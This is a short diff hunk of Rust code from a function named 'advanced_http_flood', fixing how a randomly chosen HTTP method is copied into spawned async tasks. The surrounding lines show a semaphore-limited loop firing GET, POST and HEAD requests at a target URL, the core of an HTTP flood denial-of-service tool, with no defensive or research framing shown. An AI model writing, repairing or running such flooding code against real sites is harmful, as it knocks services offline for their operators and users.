@@ -161,10 +161,10 @@ pub async fn advanced_http_flood(
         let permit = semaphore.clone().acquire_owned().await.unwrap();
         let c = client.clone();
         let url = target.to_string();
-        let method = methods.choose(&mut rand::thread_rng()).unwrap();
+        let method = *methods.choose(&mut rand::thread_rng()).unwrap();
         tasks.push(tokio::spawn(async move {
             let _permit = permit;
-            let _ = match *method {
+            let _ = match method {
                 "GET" => c.get(&url).send().await,
                 "POST" => c.post(&url).body("data").send().await,
                 "HEAD" => c.head(&url).send().await,
